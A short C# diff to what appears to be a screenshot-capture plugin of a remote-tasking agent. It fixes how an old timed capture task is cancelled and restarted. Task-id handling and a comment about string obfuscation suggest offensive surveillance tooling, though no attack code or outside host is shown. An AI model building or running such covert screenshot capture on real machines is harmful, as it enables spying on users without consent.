@@ -28,12 +28,13 @@ namespace Plugins
             if (screenshotTimer != null)
             {
 
-
                 // If a previous timer exists, stop it and dispose of it.
                 screenshotTimer.Stop();
                 screenshotTimer.Dispose();
                 TaskResponseHandler.Write("Long running task detected, canceling old task ", args["task-id"], true, "error");
                 //process_response = new Dictionary<string, string> { { "message", "0x46" + intervalInSeconds  } }, //string Obfuscation
+                this.isRunning = false;
+                cts.Cancel();
             }
 
             if (args.ContainsKey("interval") && int.TryParse(args["interval"], out intervalInSeconds))
@@ -67,6 +68,7 @@ namespace Plugins
             }
             else
             {
+                cts = new CancellationTokenSource();
                 CaptureAndSendScreenshot(args);
             }
         }
